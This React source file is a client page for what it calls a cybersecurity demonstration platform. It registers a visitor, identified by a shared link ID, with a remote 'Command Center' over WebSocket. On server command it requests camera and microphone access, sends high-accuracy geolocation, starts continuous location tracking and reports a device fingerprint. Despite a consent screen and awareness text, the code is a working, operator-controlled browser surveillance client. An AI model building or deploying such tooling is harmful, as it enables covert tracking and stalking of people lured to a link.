import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useWebSocket } from "@/hooks/use-websocket";
import { useToast } from "@/hooks/use-toast";
import { Shield, AlertTriangle, Camera, Mic, MapPin, Monitor, CheckCircle, XCircle } from "lucide-react";
// import { useParams } from "wouter";

interface ClientDashboardProps {
  linkId: string;
}

export function ClientDashboard({ linkId }: ClientDashboardProps) {
  const [hasConsented, setHasConsented] = useState(false);
  const [permissions, setPermissions] = useState<Record<string, boolean>>({});
  const [isProcessing, setIsProcessing] = useState(false);
  const { toast } = useToast();

  const { isConnected, sessionId, sendMessage } = useWebSocket({
    onMessage: (message) => {
      console.log('Client received message:', message);
      if (message.type === 'command_from_server') {
        console.log('Processing command:', message.command);
        handleServerCommand(message.command);
      } else if (message.type === 'permission_result') {
        setPermissions(prev => ({ ...prev, [message.permission]: message.granted }));
      }
    },
    onConnect: () => {
      console.log('Client connected, registering with linkId:', linkId);
      sendMessage({
        type: 'register_as_client',
        linkId,
        browserInfo: getBrowserInfo()
      });
    }
  });

  const getBrowserInfo = () => {
    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      screenWidth: screen.width,
      screenHeight: screen.height,
      colorDepth: screen.colorDepth,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      isHttps: location.protocol === 'https:',
      localStorage: typeof Storage !== 'undefined',
      sessionStorage: typeof sessionStorage !== 'undefined',
      webRTC: 'mediaDevices' in navigator
    };
  };

  const handleServerCommand = async (command: string) => {
    setIsProcessing(true);
    
    try {
      switch (command) {
        case 'get_camera':
          await requestCameraPermission();
          break;
        case 'get_microphone':
          await requestMicrophonePermission();
          break;
        case 'get_location':
          await requestLocationPermission();
          break;
        case 'get_system_info':
          await sendSystemInfo();
          break;
        case 'ping':
          sendMessage({ type: 'pong', sessionId });
          break;
        default:
          console.log('Unknown command:', command);
      }
    } catch (error) {
      console.error('Command execution failed:', error);
    } finally {
      setIsProcessing(false);
    }
  };

  const requestCameraPermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      setPermissions(prev => ({ ...prev, camera: true }));
      
      // Send permission granted message
      sendMessage({
        type: 'permission_granted',
        permission: 'camera',
        granted: true,
        sessionId
      });
      
      // Send camera stream information (we can't actually send the stream via WebSocket)
      // Instead, we'll send metadata and keep the stream active
      sendMessage({
        type: 'camera_stream',
        sessionId,
        stream: {
          active: true,
          tracks: stream.getVideoTracks().map(track => ({
            id: track.id,
            kind: track.kind,
            label: track.label,
            enabled: track.enabled,
            muted: track.muted,
            settings: track.getSettings()
          }))
        }
      });
      
      // Keep the stream active and send periodic updates
      const interval = setInterval(() => {
        if (stream.active) {
          sendMessage({
            type: 'camera_stream',
            sessionId,
            stream: {
              active: true,
              timestamp: new Date().toISOString(),
              tracks: stream.getVideoTracks().map(track => ({
                id: track.id,
                enabled: track.enabled,
                muted: track.muted,
                readyState: track.readyState
              }))
            }
          });
        } else {
          clearInterval(interval);
        }
      }, 5000);
      
      toast({
        title: "Camera Access Granted",
        description: "Camera stream is now active",
      });
    } catch (error) {
      setPermissions(prev => ({ ...prev, camera: false }));
      sendMessage({
        type: 'permission_granted',
        permission: 'camera',
        granted: false,
        sessionId
      });
      toast({
        title: "Camera Access Denied",
        description: "Camera permission was denied",
        variant: "destructive"
      });
    }
  };

  const requestMicrophonePermission = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      setPermissions(prev => ({ ...prev, microphone: true }));
      
      // Send permission granted message
      sendMessage({
        type: 'permission_granted',
        permission: 'microphone',
        granted: true,
        sessionId
      });
      
      // Send microphone stream information
      sendMessage({
        type: 'microphone_data',
        sessionId,
        data: {
          active: true,
          tracks: stream.getAudioTracks().map(track => ({
            id: track.id,
            kind: track.kind,
            label: track.label,
            enabled: track.enabled,
            muted: track.muted,
            settings: track.getSettings()
          }))
        }
      });
      
      // Keep the stream active and send periodic updates
      const interval = setInterval(() => {
        if (stream.active) {
          sendMessage({
            type: 'microphone_data',
            sessionId,
            data: {
              active: true,
              timestamp: new Date().toISOString(),
              tracks: stream.getAudioTracks().map(track => ({
                id: track.id,
                enabled: track.enabled,
                muted: track.muted,
                readyState: track.readyState
              }))
            }
          });
        } else {
          clearInterval(interval);
        }
      }, 5000);
      
      toast({
        title: "Microphone Access Granted",
        description: "Microphone stream is now active",
      });
    } catch (error) {
      setPermissions(prev => ({ ...prev, microphone: false }));
      sendMessage({
        type: 'permission_granted',
        permission: 'microphone',
        granted: false,
        sessionId
      });
      toast({
        title: "Microphone Access Denied",
        description: "Microphone permission was denied",
        variant: "destructive"
      });
    }
  };

  const requestLocationPermission = async () => {
    try {
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      });
      
      setPermissions(prev => ({ ...prev, location: true }));
      
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp
      };
      
      sendMessage({
        type: 'permission_granted',
        permission: 'location',
        granted: true,
        sessionId,
        data: locationData
      });
      
      sendMessage({
        type: 'location_data',
        sessionId,
        data: locationData
      });
      
      // Set up continuous location tracking
      const watchId = navigator.geolocation.watchPosition(
        (position) => {
          const updatedLocation = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            altitudeAccuracy: position.coords.altitudeAccuracy,
            heading: position.coords.heading,
            speed: position.coords.speed,
            timestamp: position.timestamp
          };
          
          sendMessage({
            type: 'location_data',
            sessionId,
            data: updatedLocation
          });
        },
        (error) => {
          console.error('Location tracking error:', error);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 30000
        }
      );
      
      toast({
        title: "Location Access Granted",
        description: "Continuous location tracking is now active",
      });
    } catch (error) {
      setPermissions(prev => ({ ...prev, location: false }));
      sendMessage({
        type: 'permission_granted',
        permission: 'location',
        granted: false,
        sessionId
      });
      toast({
        title: "Location Access Denied",
        description: "Location permission was denied",
        variant: "destructive"
      });
    }
  };

  const sendSystemInfo = async () => {
    try {
      const info = getBrowserInfo();
      sendMessage({
        type: 'system_info_data',
        sessionId,
        data: info
      });
      toast({
        title: "System Information Sent",
        description: "Comprehensive system information has been collected",
      });
    } catch (error) {
      toast({
        title: "System Info Error",
        description: "Failed to collect or send system information.",
        variant: "destructive"
      });
    }
  };

  const handleConsent = () => {
    setHasConsented(true);
    sendMessage({
      type: 'consent_given',
      sessionId,
      consent: true,
      browserInfo: getBrowserInfo()
    });
  };

  if (!hasConsented) {
    return (
      <div className="min-h-screen bg-slate-900 text-slate-100 flex items-center justify-center">
        <div className="max-w-2xl mx-auto px-4">
          <Card className="bg-slate-800 border-slate-600">
            <CardHeader>
              <div className="flex items-center space-x-3 mb-4">
                <Shield className="text-cyan-400 text-2xl" />
                <CardTitle className="text-slate-200">Security Demonstration</CardTitle>
              </div>
            </CardHeader>
            <CardContent>
              <div className="space-y-6">
                <div className="bg-red-500 bg-opacity-10 border border-red-500 border-opacity-30 rounded p-4">
                  <div className="flex items-center space-x-2 mb-3">
                    <AlertTriangle className="text-red-400" />
                    <h3 className="text-red-400 font-semibold">IMPORTANT NOTICE</h3>
                  </div>
                  <div className="text-slate-200 space-y-2 text-sm">
                    <p>This is an educational cybersecurity demonstration platform.</p>
                    <p>By proceeding, you consent to participate in security awareness training.</p>
                    <p>This demonstration may request browser permissions for educational purposes.</p>
                  </div>
                </div>

                <div className="space-y-4">
                  <h4 className="text-slate-200 font-medium">This demonstration may access:</h4>
                  <div className="grid grid-cols-2 gap-3">
                    <div className="flex items-center space-x-2 text-sm text-slate-400">
                      <Camera className="w-4 h-4" />
                      <span>Camera (with permission)</span>
                    </div>
                    <div className="flex items-center space-x-2 text-sm text-slate-400">
                      <Mic className="w-4 h-4" />
                      <span>Microphone (with permission)</span>
                    </div>
                    <div className="flex items-center space-x-2 text-sm text-slate-400">
                      <MapPin className="w-4 h-4" />
                      <span>Location (with permission)</span>
                    </div>
                    <div className="flex items-center space-x-2 text-sm text-slate-400">
                      <Monitor className="w-4 h-4" />
                      <span>System Information</span>
                    </div>
                  </div>
                </div>

                <div className="text-center">
                  <Button 
                    onClick={handleConsent}
                    className="bg-gradient-to-r from-cyan-500 to-blue-500 hover:from-cyan-600 hover:to-blue-600 px-8 py-3"
                  >
                    I Understand & Consent to Demonstration
                  </Button>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-900 text-slate-100">
      <header className="bg-slate-800 border-b border-slate-700 p-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center space-x-3">
            <Shield className="text-cyan-400 text-xl" />
            <div>
              <h1 className="text-xl font-bold text-slate-200">Security Demonstration Dashboard</h1>
              <p className="text-sm text-slate-400">
                Connected • Session: {sessionId?.substring(0, 8)}...
              </p>
            </div>
          </div>
        </div>
      </header>

      <div className="max-w-4xl mx-auto p-6">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          {/* Connection Status */}
          <Card className="bg-slate-800 border-slate-600">
            <CardHeader>
              <CardTitle className="text-slate-200">Connection Status</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-3">
                <div className="flex items-center space-x-2">
                  {isConnected ? (
                    <>
                      <CheckCircle className="text-green-400 w-5 h-5" />
                      <span className="text-green-400">Connected to Command Center</span>
                    </>
                  ) : (
                    <>
                      <XCircle className="text-red-400 w-5 h-5" />
                      <span className="text-red-400">Disconnected</span>
                    </>
                  )}
                </div>
                {isProcessing && (
                  <div className="flex items-center space-x-2">
                    <div className="w-4 h-4 border-2 border-cyan-400 border-t-transparent rounded-full animate-spin" />
                    <span className="text-cyan-400">Processing command...</span>
                  </div>
                )}
              </div>
            </CardContent>
          </Card>

          {/* Permission Status */}
          <Card className="bg-slate-800 border-slate-600">
            <CardHeader>
              <CardTitle className="text-slate-200">Permission Status</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-3">
                {Object.entries(permissions).map(([permission, granted]) => (
                  <div key={permission} className="flex items-center space-x-2">
                    {granted ? (
                      <CheckCircle className="text-green-400 w-4 h-4" />
                    ) : (
                      <XCircle className="text-red-400 w-4 h-4" />
                    )}
                    <span className="capitalize text-slate-400">{permission}</span>
                    <Badge className={granted ? "bg-green-500 bg-opacity-20 text-green-400" : "bg-red-500 bg-opacity-20 text-red-400"}>
                      {granted ? "Granted" : "Denied"}
                    </Badge>
                  </div>
                ))}
                {Object.keys(permissions).length === 0 && (
                  <p className="text-slate-400 text-sm">No permissions requested yet</p>
                )}
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Educational Information */}
        <Card className="bg-slate-800 border-slate-600 mt-6">
          <CardHeader>
            <CardTitle className="text-slate-200">What's Happening?</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4 text-sm text-slate-400">
              <p>
                You are connected to a cybersecurity demonstration platform. This simulates how malicious websites 
                might request permissions and collect information from your browser.
              </p>
              <p>
                <strong className="text-slate-200">Educational Purpose:</strong> This demonstration helps you understand 
                what information websites can access and how to protect yourself online.
              </p>
              <div className="bg-amber-500 bg-opacity-10 border border-amber-500 border-opacity-30 rounded p-3">
                <p className="text-amber-400">
                  <strong>Remember:</strong> Only grant permissions to websites you trust. Be cautious about 
                  what information you share online.
                </p>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}